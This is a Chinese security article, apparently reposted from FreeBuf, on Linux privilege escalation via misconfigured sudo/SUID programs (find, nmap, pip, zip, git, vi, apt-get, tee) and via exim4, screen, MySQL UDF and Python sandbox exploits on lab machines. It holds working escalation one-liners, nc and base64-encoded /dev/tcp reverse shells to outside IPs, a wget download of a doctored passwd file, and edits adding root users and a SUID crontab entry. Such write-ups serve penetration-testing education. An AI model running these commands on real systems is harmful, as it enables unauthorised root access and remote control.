> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/H5E4Pz-NJVde5kUItjIfnw)

Linux 提权，前提是拿到了一个低权限的账号，能上传和下载文件，主要思路有：

1、内核提权。网上各种大佬的 payload 很多，关键在于要能找到利用哪个 exp 以及具体如何利用。省力点的方法是用 searchsploit 或者 linux-exploit-suggester.sh 来查找，熟悉之后难度也不大。

2、suid 提权。这里也包含了 sudo 这种方式，两种方法的思路都是一样的，区别在于 suid 针对单个程序，sudo 针对某个用户。这类提权方式的主要思路是：管理员授权普通用户去执行 root 权限的操作，而不需要知道 root 的密码，合理的利用拥有 root 权限的程序，就可以实现提权。通常遇到的情况有：

（1）直接提权，sudo -i 就可以切换到 root 了；

（2）修改系统文件，如计划任务文件、用户文件、密码文件、sudoers 文件等，本文把这个作为彩蛋后续也讲一下；

（3）修改程序本身，如果对程序有写权限的话，直接把反弹的 bash 命令写到程序里，运行程序即可提权；

（4）对程序进行溢出，部分程序通过端口可以实现和用户的交互，这也就存在可以溢出的前提。

总的来说，suid 提权难度没有上限和下限，简单的直接一个 sudo -i 命令，难的涉及到溢出，相当于在挖 0day。

3、第三方应用提权，某些程序使用 root 权限启动，如果第三方服务或者程序存在漏洞或者配置问题，可以被利用来获得 root 权限。相比前几种方式，难度属于中间，不像内核提权套路很固定，也不像 suid 提权方法很灵活多样。

本文总结了常见的一些第三方应用的提权方法，所以的方法都经过实际测试，拿出来与大家相互交流和学习。（为避免文章篇幅过于冗长，每个应用具体的提权原理就不详细介绍了，感兴趣的自行查阅相关文档）

find 提权
-------

### 实例 1

一个典型的例子是将 SUDO 权限分配给 find 命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道’find’命令包含用于执行命令的参数，但攻击者可以以 root 特权执行命令。  
拿到普通用户权限之后，使用 sudo –l 查看下， 查看当前是否存在当前用户可以调用 sudo 的命令，如下图，当前用户可以执行 find 命令，然后通过 find 命令获取 root 权限。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibChSomuudhCw448J3tbdnu66errGlzRaKJycJqaibxaYt1zPtLNKsDvw/640?wx_fmt=jpeg)

nc 正向反弹

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibsxoBBTpB0tibMnwqjiaW1a8icEpybgxQLY1CnGssuFuxib96pADfZqw3bQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibmpqrpVsuzPfSL4yKfes8LmCCEYCUB9q0FT1ibBsytibnLZnnKsicIcpBQ/640?wx_fmt=jpeg)

nc 反向反弹

```
find /var/www/dirty -exec nc 192.168.167.4 8888 -t -e /bin/sh \
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibNoSpdB03mEmjia8JQ5ntGCDhOG1EnYiaRQekGcV1gNK2t9oZmKGoJCUw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibVGkVVQaWjHURbYbHpCIq1MUTdDnX10FPRatIay9ZSGbDu4JV97z2WA/640?wx_fmt=jpeg)

### 实例 2

查找具有特殊权限 SUID 的文件  

```
find / -perm -u=s -type f 2>/dev/null
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibgkvdlKq9QEwr2m9u9IficwnLouG8ZcsJTfhnatDDfY1pgC6ME9Bkhmg/640?wx_fmt=jpeg)

如果 find 以 SUID 权限运行，所有通过 find 执行的命令都会以 root 权限运行

通过 find 命令给 wget 命令提供 SUID 权限

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibouzP0GOKMjle5DfdEeibMKBictKic5kqnzlWVzoyLLzIECEwtysSbx0AA/640?wx_fmt=jpeg)

通过 OpenSSL passwd 生成一个新的用户 hacker，密码为 hack123

```
openssl passwd -1 -salt hacker hack123
$1$hacker$0vnQaCNuzDe3w9d6jHfXQ0
```

将其追加到 kali 的 / etc/passwd 文件中

将

```
hacker:$1$hacker$0vnQaCNuzDe3w9d6jHfXQ0:0:0:/root:/bin/bash
```

追加到 passwd 中  

在 Kali 上启动一个 python 服务器

python -m SimpleHTTPServer 8000

将 Kali 上的 passwd 文件下载到靶机 etc 目录下并覆盖原来的 passwd 文件

```
wget -O passwd http://10.10.10.128:8000/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibPicZqOB36aibd0ZG4G4ZCAyo2Fbs9ZS51VjJ4A5EtHutbdmFzoa5Wnicw/640?wx_fmt=jpeg)

然后切换到 hacker 用户即可，

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibFkfUtVpt0LegZ6N8l7q9jgTvvGsBU4YPjZv8vA4nYNlomSIyBeTr2w/640?wx_fmt=jpeg)

nmap 提权
-------

### 实例 1

nmap 被 suid 分配了 root 权限；

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaib2MAnunggm4PfI6TtFtL4KvzAwdhuNfPGeUJe4VRZyvkYcArCE4NUlg/640?wx_fmt=jpeg)

用 nmap 来提权；

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibUMyySSm9iaHDCKpR9Uonhv6cEfOgbovk3PibXyqBySaPszaHiaxKvxOLA/640?wx_fmt=jpeg)

### 实例 2

当单个用户被分配了 root 权限时，

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibUCkPOLwic8rpGReywbosuvAmFQ8icibVeYM3dg7cj3WdnW0GGZl0sib9bg/640?wx_fmt=jpeg)

nmap 提权；

```
echo “os.execute(‘/bin/bash’)” >> shell.nce
sudo nmap —script=/tmp/shell.nce
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibRwKB34VXahVFdxJskZAWFicn53WLdvQjhkIbrMvyNXtbvUYMdpxxdpg/640?wx_fmt=jpeg)

pip 提权
------

pip 命令被分配了 root 权限

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibcicFv7xur85X605icglPsTqkXibvwm8dgH0rNKOCa2em7SYPPOuIfy8mQ/640?wx_fmt=jpeg)

pip 提权；

```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibrTbXRic4MZDK1hsBPQRGdp25oq0BI72n3LmYLBQmt4BgVGm6R5DniaZg/640?wx_fmt=jpeg)

zip 提权
------

zip 命令被分配了 root 权限

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibstuJBapkULF880gTGZJfK9Yt0Mnl9AtQKXVEdNvRdm2Uu744UtgapQ/640?wx_fmt=jpeg)

我们可以发现 sarang 用户可以以 root 用户身份权限来运行 zip 命令，那么我们就可以通过 ZIP 来进行提权：

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT ‘sh #’
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibUCnfias8bhOzOdco3vquwVrAsTGqEDr9vZ0xqHljISavVDm6F9cqAxQ/640?wx_fmt=jpeg)

还有一种可以这样玩：先创建一个 liuwx 文件，然后在将它压缩为 zip 文件，最后使用 unzip-command 来执行 bash 命令从而提权：

```
touch liuwx
```

sudo zip /tmp/liuwx.zip /home/sarang/liuwx -T —unzip-command=”sh -c /bin/bash” tmp 为可写目录，所以压缩包放在 tmp 下；

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaib2afLSgdZpdC0jxzdcN1rNE1gcDGoajKA0QoibPDwyFRQZjRRWKyeNIw/640?wx_fmt=jpeg)

git 提权
------

git 命令被分配了 root 权限

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibxiatyVIAEEUvaOpNta8sxUTaOvhYgKdO2gaibw8cwNGYibNCTzQwu8nKQ/640?wx_fmt=jpeg)

利用 git 来提权；

```
sudo git help add
!/bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibYApiadQuQbCAb7UFyx90f6TAFR4emStXahqQbUGdR6lKVrUIyUVqP9w/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibyNadXNRSLjbo1DgF4wyzvME1BmyZpWPfOBIx9mM6GrFgWm0YQIh56g/640?wx_fmt=jpeg)

粘贴代码到此处，然后回车完成提权；

还可以；

```
sudo git help config
```

在末行命令模式输入 !/bin/bash 或 !’sh’ 完成提权

screen 提权
---------

Screen 是一款由 GNU 计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen 可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。

在 Screen 环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibK5W8zMnevwMKjxMLoADn7NBXgszsuAy77XCgauudu9iclr6wJOyCvQQ/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibtF4Ada8eNVqEhwhErRMRadAgbyibzWaTDE3dwd7QnAsOnIucN6Q4qiag/640?wx_fmt=jpeg)

仔细阅读下 41154.sh 脚本的内容，具体操作步骤为：

把 41154.sh 的代码分为 3 个文件；

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaib5ZtwTyjmC976cBC1ibXJr0pEWUQTDGUtYLXfFxdTYF7fmrHDFZZ2FOQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaib3x2FNwplZacJAWY3Vou7GLHzs0ZpHq32kRlsbhrc4iaplwRHm6rHxxQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibCALxocaQkKcdyur9aM9Rg7EbB5sxNUCQeBChpw085U9fEs2HKYSjAg/640?wx_fmt=jpeg)

将两个 c 文件在本地编译后，上传到靶机下，更改权限后运行；

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibWSoKADrl4J9icVU65lqolTibzWfO2lskltxvv0Lg1XnFiaOPvDoogVadw/640?wx_fmt=jpeg)

exim4 提权
--------

Exim4 是在剑桥大学开发的另一种消息传输代理（MTA），用于在连接到 Internet 的 Unix 系统上使用。尽管 exim 的配置与 sendmail 的配置完全不同，但是可以安装 Exim 代替 sendmail。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibOgupQ48cxB46c2I42EckHnsMWW4fU0m6E7tEc5MxibbBwCljecCbbAw/640?wx_fmt=jpeg)

sudo -l 用之前的密码试了不对，发现 exim4；

查看 exim4 当前版本号

```
/usr/sbin/exim4 —version
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibMSeY1Qricf4W56Hy0uibYL5FKeqicAhXwZy870LpQ6ibaoKVkGHZd3SJnw/640?wx_fmt=jpeg)

或者 dpkg -l | grep exim 查看包安装情况

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibd97jTic9UNNVZKv2wJdljWKG01VPx8rfCXeA1eicmEic8ffibGQiahFQbtA/640?wx_fmt=jpeg)

查找漏洞；

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibyWP4kbyVEsLvIIqfjicLC7h9a2RofcXFgzVaVibFQUssn0Pm2tuc9nEw/640?wx_fmt=jpeg)

用法介绍；

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibdPvp340JySzYKSN4fttbMuxxJYADpYx6ib6uthIdjo5l9iaIk6DUVf1A/640?wx_fmt=jpeg)

上传脚本；执行后成功；

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaib0oibFLMJKNAOZSf0h0ycRfH4yhBv2u36nfJH8MRpOT6gOWSPF6jFysg/640?wx_fmt=jpeg)

vi 提权
-----

vi 命令分配了 root 权限

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaib8nulUBhEp2hUmAb2LOfvdLTouGeD34DVnjJPzJWTicxynZEt5yqHdEA/640?wx_fmt=jpeg)

运行 sudo -l 发现该用户可以任意用户执行 vi，按 esc 后输入:!/bin/bash 直接提权至 root。

```
sudo /usr/bin/vi /tmp/jin
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibIRQAHwia7OEtAs4HCMj8kyvEOrJiaRWa8uZ8Y0zbfkutePzbWwVqPo5A/640?wx_fmt=jpeg)

esc 退出，然后输入 :!/bin/bash ；

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibictMs3PHFtDNTX43YDEzmMXHDAK8P8ZwfdZo6K3XTut4PEztZH7YiaSA/640?wx_fmt=jpeg)

或者还可以；

```
sudo /usr/bin/vi /tmp/jin
```

:set shell=/bin/sh 回车

:shell 回车

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibuORr0eaIUT15Wxic6bxSF5N41zytGsYzWFibD0BhC7eesicAanFH3C9EQ/640?wx_fmt=jpeg)

python 沙箱逃逸
-----------

1337 端口用 python 编写的，于是尝试 python 沙箱逃逸

eval(‘**import**(“os”).system(“whoami”)’) #查看是以什么权限运行

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibnZhicg05UGZ9vkzibChrplZSdkWjSvAkU5hHJdaHdiansZSK7QRQV5oMw/640?wx_fmt=jpeg)

```
eval(‘import(“os”).system(“echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2Ny4xMzEvNjY2NiAwPiYx|base64 -d|bash”)’) #反弹shell
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibhyvwcCpLa8DTWArCJRib58Y5rT3vPV64PIEaHOibKkROxYkF0VVImUrg/640?wx_fmt=jpeg)

ht 编辑器
------

ht 编辑器被分配了 root 权限

```
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
(root) NOPASSWD: !/usr/bin/su
(root) NOPASSWD: /usr/local/bin/ht
```

ht 编辑器被分配 root 权限。如果编辑 / etc/sudoers，在里面给 lone 这个用户的 sudo -l 权限再添加个 / bin/bash，可以直接拿 root 的 shell 了。

ht 运行之前要设置下，输入 export TERM=xterm

底下就是命令 f3 打开 f2 保存

打开 sudoers，在用户那又加了个 / bin/bash 指令

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibydjxwofGEU8aHp5olOib9yMkZvuUCic0YJbiaSYK1adU5eh5pUXLXo9ZQ/640?wx_fmt=jpeg)

f2 保存退出。。ctrl c

再看看 sudo -l，多了命令

```
loneferret@Kioptrix3:/tmp$ sudo -l
User loneferret may run the following commands on this host:
(root) NOPASSWD: !/usr/bin/su
(root) NOPASSWD: /usr/local/bin/ht
(root) NOPASSWD: /bin/bash
```

sudo /bin/bash 搞定，转成 root

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibMJspvSfTwnufF9eE0nHgoPfWMAj37nLxERQiaA6rKTZWkfTnnQqj8zw/640?wx_fmt=jpeg)

mysql UDF 提权
------------

查看开启的端口发现有 3306

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaib7w1w9eQFtMial5rqbyx3ulkvMnuIibDx1ibtlrn7HdrqlaAruYz8Jr5ZA/640?wx_fmt=jpeg)

ps -ef | grep root | grep mysql

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaib3x5s6xOUSCiaiatk16ICVVDib1NMMoj0LPxHARd8qiaohkwP3Qdo5XfPlA/640?wx_fmt=jpeg)

很自然想到的 MySQL UDF 提权，从前面 SQL 注入中获取到的信息发现数据库版本是 5.0.12，但是在上传动态链接库后导出时出错。然而，在查看 mysql 数据库时很幸运发现已经存在 func 表，且表中含有执行命令的函数，

```
mysql> use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from func;
+-----------------------+-----+---------------------+----------+
| name                  | ret | dl                  | type     |
+-----------------------+-----+---------------------+----------+
| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function |
| sys_exec              |   0 | lib_mysqludf_sys.so | function |
+-----------------------+-----+---------------------+----------+
2 rows in set (0.00 sec)

mysql> select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 |
+--------------------------------------+
1 row in set (0.05 sec)

mysql> exit
Bye
john@Kioptrix4:/var/www$ sudo su -
[sudo] password for john:
root@Kioptrix4:~# whoami
root
root@Kioptrix4:~# cd /root
root@Kioptrix4:~# ls
congrats.txt  lshell-0.9.12
root@Kioptrix4:~#
```

apt-get 提权
----------

执行 sudo -l，发现可以免密执行 adduser 命令，添加一个 root 组的用户

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibE5s65FZdoyib6lVb2xNSRMvJltJkCL5XXtTibKtd6niciavcqnxGxy0b3Q/640?wx_fmt=jpeg)

有了这个跟 root 同一组的用户，就可以读到一些只能 root 组和 root 读的文件:/etc/sudoers，该文件包含了能够让普通用户执行一些或者全部的 root 命令，如果该文件可以写入的话，我们可以把当前用户写入：chounana ALL=(ALL:ALL) ALL，这样当执行 sudo su 的时候，我们就可以进入到 root 了！

但现在只有读权限：

查看 sudoers 文件，查看还有哪些用户可以使用 sudo 执行命令，发现一个 jason 用户，但是这个用户并不存在，但是我们是可以新建用户的，所以需要密码（自己的密码）才能执行这个也就没有问题。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibt9nV4AwU0dmfXnmkAwTxQdMmsquIWyFeclgTQMWGSffcrLaP1Ckk5A/640?wx_fmt=jpeg)

exit 退回到 saint 用户，新建 jason 用户

```
chounana@djinn3:/home/saint$ exit
exit
saint@djinn3:~$ sudo adduser jason
Adding user `jason' ...
Adding new group `jason' (1005) ...
Adding new user `jason' (1005) with group `jason' ...
Creating home directory `/home/jason' ...
Copying files from `/etc/skel' ...
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
Changing the user information for jason
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] 
saint@djinn3:~$
```

切换到 jason 用户，使用 apt-get 命令提权，因为用户是自己建立的，所以密码也当然是知道的；

```
sudo apt-get changelog apt
!/bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibjmJSooU6AmqcYl7AGiahuWZWXibCImYicYwR5MRgmzuv6yz4t8EAszQ9A/640?wx_fmt=jpeg)

最后一个是彩蛋环节，通过 tee 命令来重写系统文件以达到提权的目的，实战中不管修改的方式如何变化，但所要修改的文件就这 3 个系统文件，修改的内容也大同小异。

tee 提权
------

这里靶机用的是 teehee 命令，可以写入文件内容并不覆盖文件原有内容，功能与 tee 命令类似。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaib7OVPBhhIl7JQG3ziblYLHmCPzaicH2H14CJR0V1MmM9bp81qgl6icdRIw/640?wx_fmt=jpeg)

虽然有密码，但不能直接切到 root，从 sudo 看，明显这个 teehee 可以不要密码以 root 身份运行，提权就靠这个程序了；

### 1、修改 / etc/passwd 用户信息

追加一个名为 hacker 的用户，将它的 uid 和 gid 也设置为 root 的 0：

```
echo “hacker::0:0:::/bin/bash” | sudo teehee -a /etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibIe7tvcG98TqOtwvhDAI6lsOBOXX1icwZNTPSbddhFBh2owSTnTHD62A/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibQG2Jk9pKia6DpmSSgIWHT4kK1tFZAjkkAIKkoh4YgCtznfZXpHGej2g/640?wx_fmt=jpeg)

### 2、修改 / etc/crontab 计划任务文件

可以在 / etc/crontab 下写入定时计划，提升到 root 权限。

crontab 介绍

Linux crontab 是用来定期执行程序的命令。当安装完成操作系统之后，默认便会启动此任务调度命令。

```
f1 f2 f3 f4 f5 program
其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。
当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推；
当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推；
当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推；
当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行，其馀类推

*    *    *    *    *
-    -    -    -    -
|    |    |    |    |
|    |    |    |    +----- 星期中星期几 (0 - 7) (星期天 为0)
|    |    |    +---------- 月份 (1 - 12) 
|    |    +--------------- 一个月中的第几天 (1 - 31)
|    +-------------------- 小时 (0 - 23)
+------------------------- 分钟 (0 - 59)
```

所以我们可以追加内容为：echo “ * root chmod 4777 /bin/sh” | sudo teehee -a /etc/crontab，表示在 / etc/crontab 下写入定时计划，一分钟后由 root 用户给 /bin/bash 命令加权限（chmod 4777 即开启 suid 和 rwx 权限）：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibPHQ2eNo3Nsp4bVBjHbJLOJibtfc4MQwibaDYu2kib0RyxPicrQEMWBfawg/640?wx_fmt=jpeg)

### 3、修改 / etc/sudoers 文件

先看看本地 sudoers 文件的语法。cat sudoers;

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaib2TS7ELQGGZTc4vXwBTDAibAUQS3D0ia0mx0DBv2x2xAKZicVfxtTKKGTA/640?wx_fmt=jpeg)

仿造写一个 charles ALL=(ALL:ALL) ALL

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibJY3rhBgcDNjyWmX86PbtGdFic0WClibAPZwibiceD27Uret6WxWqsdjJ0A/640?wx_fmt=jpeg)

可以看到现在 charles 可以以 root 用户身份运行所有命令

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39nqPqTZUdeFh0uiblOwBlaibKVheMgkyrR4411vtcG4W7CguUp9Wm3Pnkr6ndmscY1bV54XoxiaOAicA/640?wx_fmt=jpeg)

总结
--

此次对于第三方应用的提权总结就告一段落了，相对 suid 提权而言，第三方应用提权可查的资料更多一点，套路也相对单一点，不像 suid 提权需要根据程序的具体情况来处理，没有相对固定的套路。对第三方应用提权多进行总结和归纳，当再次遇到的时候心里更有底，也就不那么慌了。  

![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38Tm7G07JF6t0KtSAuSbyWtgFA8ywcatrPPlURJ9sDvFMNwRT0vpKpQ14qrYwN2eibp43uDENdXxgg/640?wx_fmt=gif)

![](http://mmbiz.qpic.cn/mmbiz_png/3Uce810Z1ibJ71wq8iaokyw684qmZXrhOEkB72dq4AGTwHmHQHAcuZ7DLBvSlxGyEC1U21UMgSKOxDGicUBM7icWHQ/640?wx_fmt=png&wxfrom=200) 交易担保 FreeBuf+ FreeBuf + 小程序：把安全装进口袋 小程序

精彩推荐

  

  

  

  

****![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib2xibAss1xbykgjtgKvut2LUribibnyiaBpicTkS10Asn4m4HgpknoH9icgqE0b0TVSGfGzs0q8sJfWiaFg/640?wx_fmt=jpeg)****

  

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR38BeMPIsiaPjUKaIib6ibHuCEJEC1aL7DzOUEkjCg6g8fes6CHHq8knicNw6F9VjnicFaicMIK9icoQrGE0A/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247485458&idx=1&sn=5d64429def7b9929c63d700ae165fbf1&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39AXOzIuxlNiahYZgWwiaicSdU6C17b5d9F7ncdz9Vm4W8WDLGOK7njZFWD1pTZmvZxjK8qGUWf0AlsA/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247485439&idx=1&sn=0aab66b0bbef868b577eac70d9705fff&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibSZod64tZYfVs9eOO83Wq83nUmS51lkhNxf89EtGvGDD3Dlqria56Wl73fmg1kGk4WNKVN8AXCuEQ/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247485424&idx=1&sn=1d4409309a035cb6ffcbdff54cc7ab7b&scene=21#wechat_redirect)  

**************![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/640?wx_fmt=gif)**************